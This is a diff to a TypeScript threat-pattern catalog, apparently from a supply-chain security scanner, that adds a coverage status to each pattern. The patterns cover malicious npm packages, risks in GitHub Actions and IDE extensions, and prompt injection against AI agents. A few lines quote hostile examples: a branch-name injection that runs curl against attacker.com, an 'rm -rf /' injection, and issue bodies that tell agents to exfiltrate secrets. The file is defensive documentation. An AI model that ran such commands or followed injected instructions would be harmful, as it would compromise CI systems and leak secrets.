@@ -9,7 +9,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Attackers often compromise a highly-trusted package and sneak in malicious code by hiding it inside a newly introduced nested dependency that developers do not inspect.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Review the newly added dependency, compare the lockfile diff, and pin or replace the parent package if the sub-dependency is suspicious.',
-    realWorldExamples: ['Axios compromise shadowing', 'ua-parser-js backdoor injection']
+    realWorldExamples: ['Axios compromise shadowing', 'ua-parser-js backdoor injection'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'install-time-remote-execution',
@@ -20,7 +21,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Lifecycle scripts (preinstall/postinstall) run on developer machines or CI runners before normal application sandboxing or code inspection can happen.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Replace the package immediately, run npm install with --ignore-scripts, or isolate the build environment.',
-    realWorldExamples: ['eslint-scope token stealer', 'crossenv payload downloader']
+    realWorldExamples: ['eslint-scope token stealer', 'crossenv payload downloader'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'lookalike-package-injection',
@@ -31,7 +33,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Attackers register lookalike names (e.g. "reqeust" instead of "request") to trick developer typos and compromise dependency trees.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Correct the spelling to the official package, delete the typosquatted package, and purge local caches.',
-    realWorldExamples: ['cross-env lookalikes', 'ts-node typosquats']
+    realWorldExamples: ['cross-env lookalikes', 'ts-node typosquats'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'fresh-release-cooldown-violation',
@@ -42,7 +45,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Malicious packages are often spotted and removed from registries within a few hours or days. Installing new versions immediately exposes pipelines to zero-days.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Pin to the previous stable version and wait for the cooldown window to pass before upgrading.',
-    realWorldExamples: ['Short-lived dependency-confusion releases']
+    realWorldExamples: ['Short-lived dependency-confusion releases'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'maintainer-account-compromise-signal',
@@ -53,7 +57,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'A compromised maintainer account allows attackers to push signed malicious updates to the official package namespace.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Perform an audit of the release code diff and contact the maintainers to verify publishing credentials.',
-    realWorldExamples: ['event-stream flatmap compromise']
+    realWorldExamples: ['event-stream flatmap compromise'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'trusted-publishing-bypass',
@@ -64,7 +69,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'If a project configured with GitHub Actions OIDC trusted publishing is suddenly published manually from a developer machine, it suggests a stolen token or compromised machine.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Inspect the release integrity, search for OIDC attestations, and request confirmation from the authors.',
-    realWorldExamples: ['PyPI manual release overrides']
+    realWorldExamples: ['PyPI manual release overrides'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'source-package-mismatch',
@@ -75,7 +81,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Attackers can keep the GitHub repository clean while injecting a backdoor exclusively inside the tarball uploaded to the registry.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Audit the tarball contents directly using OpenSoyce diff viewer or compile from the tagged source commit.',
-    realWorldExamples: ['xz-utils backdoor payload hiding']
+    realWorldExamples: ['xz-utils backdoor payload hiding'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'known-vulnerability-exposure',
@@ -86,7 +93,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Installing a package with a published vulnerability gives attackers a documented exploit path before the project has time to patch — and the advisory itself is often the first thing scanners outside of OpenSoyce pick up.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Upgrade to a patched version listed in the advisory, or replace the package; if no fix exists, file an exception with a documented expiry and mitigation note.',
-    realWorldExamples: ['log4shell (CVE-2021-44228)', 'Spring4Shell unpatched ingestion']
+    realWorldExamples: ['log4shell (CVE-2021-44228)', 'Spring4Shell unpatched ingestion'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'install-time-execution',
@@ -97,7 +105,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Lifecycle scripts run with full developer or CI permissions before any code inspection happens. Even non-remote scripts can read environment variables, write outside the install directory, or alter local tooling. This is the lower-severity sibling of install-time-remote-execution — the script exists, but evidence of a network call is absent.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Audit the lifecycle script content, prefer a fork or alternative without postinstall hooks, or install with `--ignore-scripts` in CI.',
-    realWorldExamples: ['node-ipc protest payload (initially via postinstall)']
+    realWorldExamples: ['node-ipc protest payload (initially via postinstall)'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'dependency-confusion-risk',
@@ -108,7 +117,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'When internal package names also exist publicly, package managers can resolve the public (potentially malicious) version over the intended internal one. Attackers register the public name to intercept builds at install time.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Scope private packages to a verified org namespace, configure a registry proxy that prefers internal sources, and lock the dependency to the internal feed.',
-    realWorldExamples: ['Alex Birsan 2021 disclosure across 35+ companies', '`@internal/`-style internal-name public exposures']
+    realWorldExamples: ['Alex Birsan 2021 disclosure across 35+ companies', '`@internal/`-style internal-name public exposures'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'high-blast-radius',
@@ -119,7 +129,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Even a low-severity issue in a high-blast-radius package can become a high-impact incident because of how many downstream pipelines pull it. Compromised maintainer accounts on such packages are catastrophic.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Pin the version, enable maintainer-change alerts, and review release diffs before bumping.',
-    realWorldExamples: ['ua-parser-js compromise downstream sprawl', 'event-stream breach reaching production at scale']
+    realWorldExamples: ['ua-parser-js compromise downstream sprawl', 'event-stream breach reaching production at scale'],
+    coverageStatus: 'gate-active'
   },
 
   // --- Pack 2: GitHub Actions Pattern Pack ---
@@ -132,7 +143,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Attackers who gain write access to the action repo can overwrite the release tag to point to a malicious commit, executing arbitrary code in your CI.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Update the workflow file to pin actions to full 40-character commit SHAs, accompanied by a comment containing the version tag.',
-    realWorldExamples: ['Drifting tags on utility actions']
+    realWorldExamples: ['Drifting tags on utility actions'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'ci-secret-exposure-path',
@@ -143,7 +155,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Compromised dependencies or actions running in a privileged step can read and exfiltrate GitHub tokens, cloud API keys, or deploy passwords.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Move secret access to separate, isolated jobs or run the untrusted step in a sandboxed runner with no environment variables.',
-    realWorldExamples: ['Codecov Bash Uploader leak']
+    realWorldExamples: ['Codecov Bash Uploader leak'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'pull-request-target-abuse',
@@ -154,7 +167,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'pull_request_target runs in the context of the base branch and has access to repository write tokens and secrets. Running checkout of fork code allows attackers to steal secrets.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Remove git checkout of fork code from workflows triggered by pull_request_target, or strictly enforce manual approval.',
-    realWorldExamples: ['Fork PR token leaks on open-source projects']
+    realWorldExamples: ['Fork PR token leaks on open-source projects'],
+    coverageStatus: 'catalog-only'
   },
   {
     id: 'untrusted-workflow-input',
@@ -165,7 +179,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Attackers can name a branch or issue with bash commands (e.g. "; curl http://attacker.com/leak ;") resulting in command injection during CI execution.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Pass inputs as environment variables in the action step instead of directly interpolating them into bash scripts.',
-    realWorldExamples: ['PR Title command injection bugs']
+    realWorldExamples: ['PR Title command injection bugs'],
+    coverageStatus: 'catalog-only'
   },
   {
     id: 'third-party-action-with-secrets',
@@ -176,7 +191,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Secrets passed to unverified actions can be quietly sent to an external server by the action logic.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Only pass secrets to actions published by GitHub-verified partners or audit the source code of the action.',
-    realWorldExamples: ['Exfiltration through malicious helper actions']
+    realWorldExamples: ['Exfiltration through malicious helper actions'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'unpinned-action-reference',
@@ -187,7 +203,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'The default branch changes constantly, making the CI build non-deterministic and susceptible to immediate breakage or compromise if the branch is poisoned.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Pin the action reference to a tag or commit SHA.',
-    realWorldExamples: ['CI breakage due to unexpected action refactoring']
+    realWorldExamples: ['CI breakage due to unexpected action refactoring'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'dangerous-release-permission',
@@ -198,7 +215,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'If any dependency runs arbitrary code in a build with release-write permissions, it can overwrite official assets or release packages.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Restrict workflow permissions globally to read-only, and only enable write permissions on targeted deployment jobs.',
-    realWorldExamples: ['Backdooring release binaries during build']
+    realWorldExamples: ['Backdooring release binaries during build'],
+    coverageStatus: 'catalog-only'
   },
 
   // --- Pack 3: Developer Tool Pattern Pack ---
@@ -211,7 +229,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Attackers target IDE marketplaces (like VS Code Marketplace) with useful tools containing hidden backdoors to gain local code execution on developer machines.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Limit extension installations to vetted publishers and check the reputation/rating history.',
-    realWorldExamples: ['Poisoned VS Code theme extensions']
+    realWorldExamples: ['Poisoned VS Code theme extensions'],
+    coverageStatus: 'roadmap'
   },
   {
     id: 'broad-workspace-access',
@@ -222,7 +241,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Malicious tools use wide file access to scan for SSH keys, AWS credentials, or sensitive files in the developer home directory.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Configure IDE sandboxing or run extensions in restricted workspace modes.',
-    realWorldExamples: ['SSH key exfiltration by linting tools']
+    realWorldExamples: ['SSH key exfiltration by linting tools'],
+    coverageStatus: 'roadmap'
   },
   {
     id: 'credential-path-access',
@@ -233,7 +253,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Local developer credentials are highly valuable. Staling keys allows attackers to pivot into production enterprise cloud accounts.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Block the extension, audit the network logs of the developer machine, and rotate compromised secrets.',
-    realWorldExamples: ['Malicious git helpers stealing keys']
+    realWorldExamples: ['Malicious git helpers stealing keys'],
+    coverageStatus: 'roadmap'
   },
   {
     id: 'local-shell-execution',
@@ -244,7 +265,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'IDE plugins can execute background commands silently, downloading scripts or modifying source code files without triggering compiler alerts.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Inspect execution logs and verify if background shell execution is required for the tool utility.',
-    realWorldExamples: ['Webpack dev server exploits']
+    realWorldExamples: ['Webpack dev server exploits'],
+    coverageStatus: 'roadmap'
   },
   {
     id: 'unknown-remote-endpoint',
@@ -255,7 +277,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Exfiltrating developer data or receiving shell commands requires a Command and Control (C2) server, which can be spotted through network auditing.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Restrict egress network traffic for IDE processes or block the associated domain.',
-    realWorldExamples: ['C2 traffic in compromised CLI utilities']
+    realWorldExamples: ['C2 traffic in compromised CLI utilities'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'publisher-identity-drift',
@@ -266,7 +289,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Drift in publisher identity often indicates expired domain takeovers, allowing attackers to hijack update feeds.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Verify the identity of the publisher and cross-reference with the official source repository.',
-    realWorldExamples: ['Stale domain hijackings of IDE extensions']
+    realWorldExamples: ['Stale domain hijackings of IDE extensions'],
+    coverageStatus: 'gate-active'
   },
   {
     id: 'marketplace-reputation-anomaly',
@@ -277,7 +301,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Attackers buy fake installs to boost search rank and make a poisoned tool look highly reputable.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Do not install tools with low reviews/ratings despite high download statistics.',
-    realWorldExamples: ['Installs-for-hire marketplace scams']
+    realWorldExamples: ['Installs-for-hire marketplace scams'],
+    coverageStatus: 'roadmap'
   },
 
   // --- Pack 4: AI Agent Workflow Pattern Pack ---
@@ -290,7 +315,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'AI agents that read data from issues or PRs can be hijacked by hidden prompts in the text, telling the agent to write bugs or bypass auth.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Isolate agent instructions from user-provided data, and use system prompt boundaries.',
-    realWorldExamples: ['Indirect prompt injections hijacking code-generation bots']
+    realWorldExamples: ['Indirect prompt injections hijacking code-generation bots'],
+    coverageStatus: 'roadmap'
   },
   {
     id: 'prompt-to-script-injection',
@@ -301,7 +327,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'If the agent accepts input like "delete file name; rm -rf /", prompt instructions can cause the agent to run dangerous commands on the runner.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Run agent executions in ephemeral, read-only containers and enforce runtime strict command schemas.',
-    realWorldExamples: ['Arbitrary code execution via agent tools']
+    realWorldExamples: ['Arbitrary code execution via agent tools'],
+    coverageStatus: 'roadmap'
   },
   {
     id: 'untrusted-issue-body-to-agent-prompt',
@@ -312,7 +339,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Attackers can file issues with system-override instructions that force the agent to exfiltrate database records or commit secrets.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Sanitize issue bodies, strip out prompt markers, and filter inputs before passing to LLM APIs.',
-    realWorldExamples: ['Exfiltration of agent environment variables via issue body injections']
+    realWorldExamples: ['Exfiltration of agent environment variables via issue body injections'],
+    coverageStatus: 'roadmap'
   },
   {
     id: 'agent-output-to-shell',
@@ -323,7 +351,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'Direct shell piping creates a critical path where any jailbreak or compromise of the LLM leads to immediate server compromise.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Enforce human-in-the-loop review for all commands generated by the agent before shell execution.',
-    realWorldExamples: ['Auto-GPT-style execution failures']
+    realWorldExamples: ['Auto-GPT-style execution failures'],
+    coverageStatus: 'roadmap'
   },
   {
     id: 'agent-with-write-token',
@@ -334,7 +363,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'If hijacked by prompt injection, the agent can write commits directly to main, bypass pull request reviews, or overwrite branch protection settings.',
     defaultPolicyImpact: 'warn',
     recommendedAction: 'Restrict the agent’s GitHub token permissions to read-only or require approvals for all branch write actions.',
-    realWorldExamples: ['Auto-commit bot compromises']
+    realWorldExamples: ['Auto-commit bot compromises'],
+    coverageStatus: 'roadmap'
   },
   {
     id: 'agent-with-release-permission',
@@ -345,7 +375,8 @@ export const OTS_PATTERN_DEFINITIONS = [
     whyItMatters: 'An agent compromised via prompt injection can publish a backdoor version of your software to package registries under your organization name.',
     defaultPolicyImpact: 'block',
     recommendedAction: 'Ensure publishing and releasing are exclusively performed by cryptographically signed human actions or verified OIDC jobs.',
-    realWorldExamples: ['Registry hijacking through automated CD tokens']
+    realWorldExamples: ['Registry hijacking through automated CD tokens'],
+    coverageStatus: 'roadmap'
   }
 ];
 
